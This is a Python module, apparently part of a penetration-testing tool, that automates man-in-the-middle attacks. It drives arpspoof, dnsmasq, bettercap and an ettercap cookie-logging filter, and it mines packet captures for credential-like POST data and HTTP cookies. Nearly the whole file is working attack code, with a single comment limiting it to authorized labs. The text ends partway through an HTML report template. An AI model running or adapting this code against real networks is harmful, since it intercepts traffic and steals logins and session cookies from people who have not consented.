#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Natasha AI Penetration Testing Tool
Man-in-the-Middle Attack Module

This module implements man-in-the-middle attack capabilities for the Natasha AI
Penetration Testing Tool, including ARP spoofing, DNS spoofing, SSL stripping,
and packet capture.
"""

import os
import time
import signal
import logging
import threading
import subprocess
import json
import re
import shutil
import shlex
import uuid
from typing import Dict, List, Tuple, Optional, Union, Any
from enum import Enum

class MITMAttackType(Enum):
    """Enumeration of MITM attack types."""
    ARP_SPOOF = "arp_spoof"
    DNS_SPOOF = "dns_spoof"
    SSL_STRIP = "ssl_strip"
    CAPTIVE_PORTAL = "captive_portal"
    PACKET_CAPTURE = "packet_capture"
    SESSION_HIJACK = "session_hijack"

class MITMAttack:
    """Man-in-the-Middle attack module for Natasha AI Penetration Testing Tool."""
    
    def __init__(self, interface_name: str = "wlan0"):
        """Initialize the MITM attack module.
        
        Args:
            interface_name: Name of the network interface to use
        """
        self.interface_name = interface_name
        self.lock = threading.Lock()
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.attack_status = {}
        self.capture_dir = os.path.join(os.path.expanduser("~"), "natasha", "captures")
        self.analysis_dir = os.path.join(os.path.expanduser("~"), "natasha", "analysis")
        self.payload_dir = os.path.join(os.path.expanduser("~"), "natasha", "payloads")
        
        # Ensure directories exist
        os.makedirs(self.capture_dir, exist_ok=True)
        os.makedirs(self.analysis_dir, exist_ok=True)
        os.makedirs(self.payload_dir, exist_ok=True)
        
        # Load attack templates
        self.attack_templates = self._load_attack_templates()
    
    def _load_attack_templates(self) -> Dict[str, Any]:
        """Load MITM attack templates from JSON file.
        
        Returns:
            Dictionary containing attack templates
        """
        try:
            template_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'templates', 'mitm_attack.json')
            
            if os.path.exists(template_path):
                with open(template_path, 'r') as f:
                    templates = json.load(f)
                logging.info(f"Loaded {len(templates.get('attack_types', []))} MITM attack templates")
                return templates
            else:
                logging.warning(f"MITM attack template file not found: {template_path}")
                return {}
        except Exception as e:
            logging.error(f"Error loading MITM attack templates: {e}")
            return {}
    
    def check_requirements(self, attack_type: MITMAttackType) -> Tuple[bool, List[str]]:
        """Check if all required tools for an attack are installed.
        
        Args:
            attack_type: Type of MITM attack
            
        Returns:
            Tuple of (all_installed, missing_tools)
        """
        # Built-in fallback requirements if templates are missing or do not include the attack
        default_requirements: Dict[MITMAttackType, List[str]] = {
            MITMAttackType.ARP_SPOOF: ["arpspoof", "sysctl"],
            MITMAttackType.DNS_SPOOF: ["dnsmasq"],
            MITMAttackType.SSL_STRIP: ["iptables", "sysctl", "bettercap"],
            MITMAttackType.PACKET_CAPTURE: ["tcpdump", "tshark", "capinfos"],
            MITMAttackType.SESSION_HIJACK: ["ettercap", "etterfilter"],
        }
        
        requirements: List[str] = []
        # If templates are available, try to use them first
        if self.attack_templates and 'attack_types' in self.attack_templates:
            attack_template = None
            for template in self.attack_templates.get('attack_types', []):
                if template.get('name') == attack_type.value:
                    attack_template = template
                    break
            if attack_template:
                requirements = attack_template.get('requirements', [])
            else:
                # Fallback to defaults if template missing
                logging.warning(f"Attack template not found for {attack_type.value}; using default requirements")
                requirements = default_requirements.get(attack_type, [])
        else:
            # Templates not loaded; fallback to defaults
            logging.info("Attack templates not loaded; using default requirements")
            requirements = default_requirements.get(attack_type, [])
        
        if not requirements:
            # No way to determine requirements; conservatively fail with an explanation
            return False, ["Requirements not defined (no templates and no defaults)"]
        
        # Map package names or generic labels to actual executables to test
        alt_exec_map: Dict[str, List[str]] = {
            # Packages → representative executables
            "dsniff": ["arpspoof"],
            "wireshark": ["wireshark", "tshark", "dumpcap"],
            "apache2": ["apache2", "httpd"],
            # Explicit executables (pass through); included for clarity
            "arpspoof": ["arpspoof"],
            "dnsmasq": ["dnsmasq"],
            "iptables": ["iptables"],
            "tcpdump": ["tcpdump"],
            "tshark": ["tshark"],
            "capinfos": ["capinfos"],
            "ettercap": ["ettercap"],
            "etterfilter": ["etterfilter"],
            "sslstrip": ["sslstrip"],
            "bettercap": ["bettercap"],
            "hostapd": ["hostapd"],
            "php": ["php"],
            "sysctl": ["sysctl"],
        }

        missing_tools: List[str] = []
        for req in requirements:
            candidates = alt_exec_map.get(req, [req])
            # Consider requirement satisfied if any candidate executable is available
            found = False
            for exe in candidates:
                try:
                    if shutil.which(exe) is not None:
                        found = True
                        break
                except Exception:
                    # Continue trying other candidates
                    pass
            if not found:
                # Report in a helpful form
                if len(candidates) > 1:
                    missing_tools.append(f"{req} (any of: {', '.join(candidates)})")
                else:
                    missing_tools.append(candidates[0])

        return len(missing_tools) == 0, missing_tools
    
    def _prevent_overlap(self) -> bool:
        """Return False and log if an attack is already running."""
        if self.attack_thread and self.attack_thread.is_alive():
            logging.error("Another MITM attack is already running. Stop it before starting a new one.")
            return False
        return True
    
    def _require_root(self, operation: str) -> bool:
        """Ensure the process has root privileges for privileged operations."""
        try:
            if os.geteuid() != 0:
                logging.error(f"{operation} requires root privileges (run as root/sudo).")
                return False
        except Exception:
            # Environments lacking geteuid are treated as permissive
            pass
        return True

    def _require_interface(self, operation: str) -> bool:
        """Ensure the configured network interface exists and is up."""
        try:
            iface_path = os.path.join("/sys/class/net", self.interface_name)
            if not os.path.exists(iface_path):
                logging.error(f"{operation} requires network interface '{self.interface_name}' which was not found.")
                return False
            operstate_path = os.path.join(iface_path, "operstate")
            state = ""
            try:
                with open(operstate_path, "r") as f:
                    state = f.read().strip()
            except Exception:
                state = ""
            if state and state.lower() != "up":
                logging.error(f"{operation} requires interface '{self.interface_name}' to be up (current state: '{state}').")
                return False
        except Exception as e:
            logging.error(f"Interface validation failed for {self.interface_name}: {e}")
            return False
        return True

    def _terminate_process(self, proc: subprocess.Popen, name: str, timeout: int = 5) -> None:
        """Terminate a subprocess with escalation to kill if needed."""
        if not proc:
            return
        try:
            proc.terminate()
            try:
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                logging.warning(f"{name} did not exit gracefully; killing")
                proc.kill()
        except Exception as e:
            logging.debug(f"Error terminating {name}: {e}")

    def _valid_ipv4(self, ip: str) -> bool:
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for p in parts:
                v = int(p)
                if v < 0 or v > 255:
                    return False
            return True
        except Exception:
            return False

    def _valid_domain(self, domain: str) -> bool:
        pattern = r"^(?=.{1,253}$)(?!-)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,}$"
        return re.match(pattern, domain) is not None
    
    def start_arp_spoof(self, target_ip: str, gateway_ip: str) -> bool:
        """Start ARP spoofing attack.
        
        Args:
            target_ip: IP address of the target
            gateway_ip: IP address of the gateway
            
        Returns:
            True if attack started successfully, False otherwise
        """
        if not self._prevent_overlap():
            return False
        
        if not self._require_interface("ARP spoofing"):
            return False
        
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.ARP_SPOOF)
        if not requirements_met:
            logging.error(f"Missing required tools for ARP spoofing: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting ARP spoofing attack: target={target_ip}, gateway={gateway_ip}")
        
        if not self._require_root("ARP spoofing"):
            return False
        
        # Validate inputs
        if not self._valid_ipv4(target_ip):
            logging.error(f"Invalid target IP for ARP spoofing: {target_ip}")
            return False
        if not self._valid_ipv4(gateway_ip):
            logging.error(f"Invalid gateway IP for ARP spoofing: {gateway_ip}")
            return False
        
        # Enable IP forwarding
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to enable IP forwarding: {e}")
            return False
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_arp_spoof, 
                                             args=(target_ip, gateway_ip))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        with self.lock:
            self.attack_status = {
                "type": MITMAttackType.ARP_SPOOF,
                "status": "running",
                "start_time": time.time(),
                "target_ip": target_ip,
                "gateway_ip": gateway_ip
            }
        
        return True
    
    def _run_arp_spoof(self, target_ip: str, gateway_ip: str) -> None:
        """Run ARP spoofing attack in a background thread.
        
        Args:
            target_ip: IP address of the target
            gateway_ip: IP address of the gateway
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Start ARP spoofing
            cmd = ["arpspoof", "-i", self.interface_name, "-t", target_ip, gateway_ip]
            target_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Spoof in the other direction as well
            cmd = ["arpspoof", "-i", self.interface_name, "-t", gateway_ip, target_ip]
            gateway_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                
                # Check if processes are still running
                if target_process.poll() is not None or gateway_process.poll() is not None:
                    logging.error("ARP spoofing process terminated unexpectedly")
                    break
            
            # Terminate processes
            self._terminate_process(target_process, "arpspoof(target)")
            self._terminate_process(gateway_process, "arpspoof(gateway)")
            
            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Update status
            with self.lock:
                self.attack_status["status"] = "stopped"
                self.attack_status["end_time"] = time.time()
            
        except Exception as e:
            logging.error(f"Error during ARP spoofing attack: {e}")
            with self.lock:
                self.attack_status["status"] = "failed"
                self.attack_status["error"] = str(e)
                self.attack_status["end_time"] = time.time()
            # Attempt cleanup on error
            self._terminate_process(target_process, "arpspoof(target)")
            self._terminate_process(gateway_process, "arpspoof(gateway)")
            try:
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as ce:
                logging.warning(f"Cleanup: failed to disable IP forwarding: {ce}")
    
    def start_dns_spoof(self, domain: str, redirect_ip: str) -> bool:
        """Start DNS spoofing attack.
        
        Args:
            domain: Domain to spoof
            redirect_ip: IP address to redirect to
            
        Returns:
            True if attack started successfully, False otherwise
        """
        if not self._prevent_overlap():
            return False
        
        if not self._require_interface("DNS spoofing"):
            return False
        
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.DNS_SPOOF)
        if not requirements_met:
            logging.error(f"Missing required tools for DNS spoofing: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting DNS spoofing attack: domain={domain}, redirect_ip={redirect_ip}")
        
        if not self._require_root("DNS spoofing"):
            return False
        
        # Validate inputs
        if not self._valid_domain(domain):
            logging.error(f"Invalid domain for DNS spoofing: {domain}")
            return False
        if not self._valid_ipv4(redirect_ip):
            logging.error(f"Invalid redirect IP for DNS spoofing: {redirect_ip}")
            return False
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_dns_spoof, 
                                             args=(domain, redirect_ip))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        with self.lock:
            self.attack_status = {
                "type": MITMAttackType.DNS_SPOOF,
                "status": "running",
                "start_time": time.time(),
                "domain": domain,
                "redirect_ip": redirect_ip
            }
        
        return True
    
    def _run_dns_spoof(self, domain: str, redirect_ip: str) -> None:
        """Run DNS spoofing attack in a background thread.
        
        Args:
            domain: Domain to spoof
            redirect_ip: IP address to redirect to
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Create dnsmasq configuration
            config_file = os.path.join(self.capture_dir, "dnsmasq.conf")
            pid_file = os.path.join(self.capture_dir, "dnsmasq.pid")
            with open(config_file, 'w') as f:
                f.write(f"address=/{domain}/{redirect_ip}\n")
                f.write(f"interface={self.interface_name}\n")
                f.write("no-dhcp-interface=lo\n")
                f.write("no-hosts\n")
                f.write("no-resolv\n")
                f.write("log-queries\n")
                f.write(f"log-facility={os.path.join(self.capture_dir, 'dnsmasq.log')}\n")
            
            # Start dnsmasq
            cmd = ["dnsmasq", "-C", config_file, "-d", "--bind-interfaces", "-x", pid_file]
            dns_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                
                # Check if process is still running
                if dns_process.poll() is not None:
                    logging.error("DNS spoofing process terminated unexpectedly")
                    break
            
            # Terminate process
            self._terminate_process(dns_process, "dnsmasq")
            
            # Clean up
            if os.path.exists(config_file):
                os.remove(config_file)
            if 'pid_file' in locals() and os.path.exists(pid_file):
                os.remove(pid_file)
            
            # Update status
            with self.lock:
                self.attack_status["status"] = "stopped"
                self.attack_status["end_time"] = time.time()
            
        except Exception as e:
            logging.error(f"Error during DNS spoofing attack: {e}")
            with self.lock:
                self.attack_status["status"] = "failed"
                self.attack_status["error"] = str(e)
                self.attack_status["end_time"] = time.time()
            self._terminate_process(dns_process, "dnsmasq")
            try:
                if os.path.exists(config_file):
                    os.remove(config_file)
                if 'pid_file' in locals() and os.path.exists(pid_file):
                    os.remove(pid_file)
            except Exception as ce:
                logging.warning(f"Cleanup: failed to remove dnsmasq files: {ce}")
    
    def start_ssl_strip(self, port: int = 10000) -> bool:
        """Start SSL stripping attack.
        
        Args:
            port: Port to listen on
            
        Returns:
            True if attack started successfully, False otherwise
        """
        if not self._prevent_overlap():
            return False
        
        if not self._require_interface("SSL stripping"):
            return False
        
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.SSL_STRIP)
        if not requirements_met:
            logging.error(f"Missing required tools for SSL stripping: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting SSL stripping attack on port {port}")
        
        if not self._require_root("SSL stripping"):
            return False
        
        # Validate inputs
        try:
            p = int(port)
        except Exception:
            logging.error(f"Invalid port (not an integer) for SSL stripping: {port}")
            return False
        if p < 1 or p > 65535:
            logging.error(f"Invalid port (out of range 1-65535) for SSL stripping: {port}")
            return False
        
        # Enable IP forwarding
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to enable IP forwarding: {e}")
            return False
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_ssl_strip, 
                                             args=(port,))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        with self.lock:
            self.attack_status = {
                "type": MITMAttackType.SSL_STRIP,
                "status": "running",
                "start_time": time.time(),
                "port": port
            }
        
        return True
    
    def _run_ssl_strip(self, port: int) -> None:
        """Run bettercap-based MITM (replacement for deprecated sslstrip).
        
        Args:
            port: Unused; kept for backward compatibility
        """
        try:
            # Reset stop event
            self.stop_event.clear()

            # Prepare bettercap caplet and logs
            timestamp = time.strftime('%Y%m%d-%H%M%S')
            log_file = os.path.join(self.capture_dir, f"bettercap_{timestamp}.log")
            caplet_file = os.path.join(self.capture_dir, f"bettercap_{timestamp}.cap")

            # Caplet content: ARP spoof (full duplex), enable events stream to a log, enable HTTP proxy
            # Note: HSTS prevents real "ssl stripping" on modern sites; this is for authorized lab demos only.
            caplet = f"""
set net.sniff.verbose true
set events.stream.output {log_file}
events.stream on
net.probe on
set arp.spoof.internal true
set arp.spoof.fullduplex true
arp.spoof on
http.proxy on
"""
            with open(caplet_file, 'w') as f:
                f.write(caplet)

            # Enable IP forwarding (bettercap may also handle this)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Launch bettercap
            cmd = ["bettercap", "-iface", self.interface_name, "-caplet", caplet_file]
            bc_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                if bc_process.poll() is not None:
                    logging.error("bettercap process terminated unexpectedly")
                    break

            # Terminate bettercap
            self._terminate_process(bc_process, "bettercap")

            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Update status
            with self.lock:
                self.attack_status["status"] = "stopped"
                self.attack_status["end_time"] = time.time()
                self.attack_status["log_file"] = log_file
                self.attack_status["caplet_file"] = caplet_file

        except Exception as e:
            logging.error(f"Error during bettercap MITM: {e}")
            with self.lock:
                self.attack_status["status"] = "failed"
                self.attack_status["error"] = str(e)
                self.attack_status["end_time"] = time.time()
            try:
                self._terminate_process(bc_process, "bettercap")
            except Exception:
                pass
            try:
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as ce:
                logging.warning(f"Cleanup: failed to disable IP forwarding: {ce}")
    
    def start_packet_capture(self, filter_expr: str = "", duration: int = 300) -> bool:
        """Start packet capture.
        
        Args:
            filter_expr: BPF filter expression
            duration: Duration of capture in seconds
            
        Returns:
            True if capture started successfully, False otherwise
        """
        if not self._prevent_overlap():
            return False
        
        if not self._require_interface("Packet capture"):
            return False
        
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.PACKET_CAPTURE)
        if not requirements_met:
            logging.error(f"Missing required tools for packet capture: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting packet capture: filter='{filter_expr}', duration={duration}s")
        
        if not self._require_root("Packet capture"):
            return False
        
        # Validate inputs
        try:
            d = int(duration)
        except Exception:
            logging.error(f"Invalid duration (not an integer) for packet capture: {duration}")
            return False
        if d <= 0:
            logging.error(f"Invalid duration (must be > 0) for packet capture: {duration}")
            return False
        
        # Create a thread for the capture
        self.attack_thread = threading.Thread(target=self._run_packet_capture, 
                                             args=(filter_expr, duration))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        with self.lock:
            self.attack_status = {
                "type": MITMAttackType.PACKET_CAPTURE,
                "status": "running",
                "start_time": time.time(),
                "filter": filter_expr,
                "duration": duration
            }
        
        return True
    
    def _run_packet_capture(self, filter_expr: str, duration: int) -> None:
        """Run packet capture in a background thread.
        
        Args:
            filter_expr: BPF filter expression
            duration: Duration of capture in seconds
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Create output file
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            pcap_file = os.path.join(self.capture_dir, f"capture_{timestamp}.pcap")
            
            # Build tcpdump command
            cmd = ["tcpdump", "-i", self.interface_name, "-w", pcap_file]
            if filter_expr:
                try:
                    cmd.extend(shlex.split(filter_expr))
                except Exception:
                    cmd.append(filter_expr)
            
            # Start tcpdump
            capture_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for duration or stop event
            start_time = time.time()
            while not self.stop_event.is_set() and time.time() - start_time < duration:
                time.sleep(1)
                
                # Check if process is still running
                if capture_process.poll() is not None:
                    logging.error("Packet capture process terminated unexpectedly")
                    break
            
            # Terminate process
            self._terminate_process(capture_process, "tcpdump")
            
            # Generate summary
            summary_file = os.path.join(self.analysis_dir, f"capture_summary_{timestamp}.txt")
            
            # Use tshark to analyze the capture
            cmd = ["tshark", "-r", pcap_file, "-q", "-z", "io,stat,1", "-z", "conv,ip", 
                  "-z", "http,tree", "-z", "dns,tree"]
            
            with open(summary_file, 'w') as f:
                summary_process = subprocess.run(cmd, stdout=f, stderr=subprocess.PIPE)
            
            # Update status
            with self.lock:
                self.attack_status["status"] = "completed"
                self.attack_status["end_time"] = time.time()
                self.attack_status["pcap_file"] = pcap_file
                self.attack_status["summary_file"] = summary_file
            
        except Exception as e:
            logging.error(f"Error during packet capture: {e}")
            with self.lock:
                self.attack_status["status"] = "failed"
                self.attack_status["error"] = str(e)
                self.attack_status["end_time"] = time.time()
    
    def start_session_hijack(self, target_ip: str) -> bool:
        """Start session hijacking attack.
        
        Args:
            target_ip: IP address of the target
            
        Returns:
            True if attack started successfully, False otherwise
        """
        if not self._prevent_overlap():
            return False
        
        if not self._require_interface("Session hijacking"):
            return False
        
        # Check requirements
        requirements_met, missing_tools = self.check_requirements(MITMAttackType.SESSION_HIJACK)
        if not requirements_met:
            logging.error(f"Missing required tools for session hijacking: {', '.join(missing_tools)}")
            return False
        
        logging.info(f"Starting session hijacking attack: target={target_ip}")
        
        if not self._require_root("Session hijacking"):
            return False
        
        # Validate inputs
        if not self._valid_ipv4(target_ip):
            logging.error(f"Invalid target IP for session hijacking: {target_ip}")
            return False
        
        # Create a thread for the attack
        self.attack_thread = threading.Thread(target=self._run_session_hijack, 
                                             args=(target_ip,))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Update attack status
        with self.lock:
            self.attack_status = {
                "type": MITMAttackType.SESSION_HIJACK,
                "status": "running",
                "start_time": time.time(),
                "target_ip": target_ip
            }
        
        return True
    
    def _run_session_hijack(self, target_ip: str) -> None:
        """Run session hijacking attack in a background thread.
        
        Args:
            target_ip: IP address of the target
        """
        try:
            # Reset stop event
            self.stop_event.clear()
            
            # Create ettercap filter for cookie capture
            filter_file = os.path.join(self.payload_dir, "cookie_filter.ef")
            cookie_tmp = os.path.join("/tmp", f"cookies_{uuid.uuid4().hex}.log")
            with open(filter_file, 'w') as f:
                f.write('if (ip.proto == TCP && tcp.dst == 80) {\n')
                f.write('  if (search(DATA.data, "Cookie")) {\n')
                f.write(f'    log(DATA.data, "{cookie_tmp}");\n')
                f.write('  }\n')
                f.write('}\n')
            
            # Compile the filter
            subprocess.run(["etterfilter", filter_file, "-o", f"{filter_file}.cf"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Start ettercap
            cmd = ["ettercap", "-T", "-q", "-F", f"{filter_file}.cf", "-M", "arp", "/"+target_ip+"/", "//"]
            ettercap_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for stop event
            while not self.stop_event.is_set():
                time.sleep(1)
                
                # Check if process is still running
                if ettercap_process.poll() is not None:
                    logging.error("Session hijacking process terminated unexpectedly")
                    break
                
                # Check for captured cookies
                if os.path.exists(cookie_tmp):
                    # Copy to our capture directory
                    cookie_file = os.path.join(self.capture_dir, f"cookies_{time.strftime('%Y%m%d-%H%M%S')}.log")
                    shutil.copy(cookie_tmp, cookie_file)
                    with self.lock:
                        self.attack_status["cookie_file"] = cookie_file
            
            # Terminate process
            self._terminate_process(ettercap_process, "ettercap")
            
            # Clean up
            if os.path.exists(filter_file):
                os.remove(filter_file)
            if os.path.exists(f"{filter_file}.cf"):
                os.remove(f"{filter_file}.cf")
            if 'cookie_tmp' in locals() and os.path.exists(cookie_tmp):
                os.remove(cookie_tmp)
            
            # Update status
            with self.lock:
                self.attack_status["status"] = "stopped"
                self.attack_status["end_time"] = time.time()
            
        except Exception as e:
            logging.error(f"Error during session hijacking attack: {e}")
            with self.lock:
                self.attack_status["status"] = "failed"
                self.attack_status["error"] = str(e)
                self.attack_status["end_time"] = time.time()
            self._terminate_process(ettercap_process, "ettercap")
            try:
                if os.path.exists(filter_file):
                    os.remove(filter_file)
                if os.path.exists(f"{filter_file}.cf"):
                    os.remove(f"{filter_file}.cf")
                if 'cookie_tmp' in locals() and os.path.exists(cookie_tmp):
                    os.remove(cookie_tmp)
            except Exception as ce:
                logging.warning(f"Cleanup: failed to remove session hijack artifacts: {ce}")
    
    def stop_attack(self) -> None:
        """Stop the current attack."""
        logging.info("Stopping MITM attack")
        self.stop_event.set()
        
        # Wait for attack thread to finish
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        
        # Clean up based on attack type
        with self.lock:
            atk_type = self.attack_status.get("type")
            port = self.attack_status.get("port", 10000)
        if atk_type == MITMAttackType.ARP_SPOOF:
            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        elif atk_type == MITMAttackType.SSL_STRIP:
            # Clean up iptables rules
            # Using captured port from snapshot above
            subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", 
                          "-j", "REDIRECT", "--to-port", str(port)], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Disable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Update status
        with self.lock:
            self.attack_status["status"] = "stopped"
            self.attack_status["end_time"] = time.time()
    
    def analyze_capture(self, pcap_file: str) -> Dict[str, Any]:
        """Analyze a packet capture file.
        
        Args:
            pcap_file: Path to the PCAP file
            
        Returns:
            Dictionary containing analysis results
        """
        if not os.path.exists(pcap_file):
            logging.error(f"PCAP file not found: {pcap_file}")
            return {"error": "PCAP file not found"}
        
        # Ensure required analysis tools are available
        missing_tools = [t for t in ('capinfos', 'tshark') if shutil.which(t) is None]
        if missing_tools:
            return {"error": f"Required analysis tools not found: {', '.join(missing_tools)}"}
        
        analysis = {
            "file": pcap_file,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "statistics": {},
            "protocols": {},
            "hosts": {},
            "credentials": [],
            "cookies": []
        }
        
        try:
            # Get basic statistics
            cmd = ["capinfos", pcap_file]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse statistics
            for line in output.splitlines():
                if ":" in line:
                    key, value = line.split(":", 1)
                    analysis["statistics"][key.strip()] = value.strip()
            
            # Get protocol statistics
            cmd = ["tshark", "-r", pcap_file, "-q", "-z", "io,phs"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse protocol statistics
            in_protocols = False
            for line in output.splitlines():
                if "Protocol Hierarchy Statistics" in line:
                    in_protocols = True
                    continue
                if in_protocols and line.strip():
                    if "frames" in line and "bytes" in line:
                        parts = line.strip().split()
                        if len(parts) >= 5:
                            protocol = parts[0]
                            frames = parts[1]
                            bytes_val = parts[3]
                            analysis["protocols"][protocol] = {
                                "frames": frames,
                                "bytes": bytes_val
                            }
            
            # Get host statistics
            cmd = ["tshark", "-r", pcap_file, "-q", "-z", "endpoints,ip"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse host statistics
            in_hosts = False
            for line in output.splitlines():
                if "IPv4 Endpoints" in line:
                    in_hosts = True
                    continue
                if in_hosts and line.strip():
                    parts = line.strip().split()
                    if len(parts) >= 5 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
                        ip = parts[0]
                        tx_frames = parts[1]
                        tx_bytes = parts[2]
                        rx_frames = parts[3]
                        rx_bytes = parts[4]
                        analysis["hosts"][ip] = {
                            "tx_frames": tx_frames,
                            "tx_bytes": tx_bytes,
                            "rx_frames": rx_frames,
                            "rx_bytes": rx_bytes
                        }
            
            # Look for credentials
            cmd = ["tshark", "-r", pcap_file, "-Y", "http.request.method == POST", "-T", "fields", 
                  "-e", "http.host", "-e", "http.request.uri", "-e", "http.file_data"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse potential credentials
            for line in output.splitlines():
                parts = line.split("\t")
                if len(parts) >= 3:
                    host = parts[0]
                    uri = parts[1]
                    data = parts[2]
                    
                    # Look for common credential patterns
                    if "user" in data.lower() or "pass" in data.lower() or "login" in data.lower() or "email" in data.lower():
                        analysis["credentials"].append({
                            "host": host,
                            "uri": uri,
                            "data": data
                        })
            
            # Look for cookies
            cmd = ["tshark", "-r", pcap_file, "-Y", "http.cookie", "-T", "fields", 
                  "-e", "http.host", "-e", "http.cookie"]
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            output = process.stdout.decode('utf-8', errors='ignore')
            
            # Parse cookies
            for line in output.splitlines():
                parts = line.split("\t")
                if len(parts) >= 2:
                    host = parts[0]
                    cookie = parts[1]
                    analysis["cookies"].append({
                        "host": host,
                        "cookie": cookie
                    })
            
            return analysis
            
        except Exception as e:
            logging.error(f"Error analyzing capture: {e}")
            return {"error": str(e)}
    
    def generate_report(self, analysis: Dict[str, Any], output_format: str = "text") -> str:
        """Generate a report from analysis results.
        
        Args:
            analysis: Analysis results
            output_format: Format of the report (text, json, html)
            
        Returns:
            Report in the specified format
        """
        if "error" in analysis:
            return f"Error: {analysis['error']}"
        
        if output_format == "json":
            return json.dumps(analysis, indent=2)
        
        elif output_format == "html":
            # Generate HTML report
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>MITM Attack Analysis Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1, h2, h3 {{ color: #333; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
        .warning {{ color: orange; }}
        .danger {{ color: red; }}
    </style>
</head>
<body>
    <h1>MITM Attack Analysis Report</h1>
    <p>Generated: {analysis.get('timestamp', 'Unknown')}</p>
    <p>File: {analysis.get('file', 'Unknown')}</p>
    
    <h2>Capture Statistics</h2>
    <table>
        <tr>
            <th>Statistic</th>
            <th>Value</th>
        </tr>
"""
            
            # Add statistics
            for key, value in analysis.get('statistics', {}).items():
                html += f"""
        <tr>
            <td>{key}</td>
            <td>{value}</td>
        </tr>"""
            
            html += """
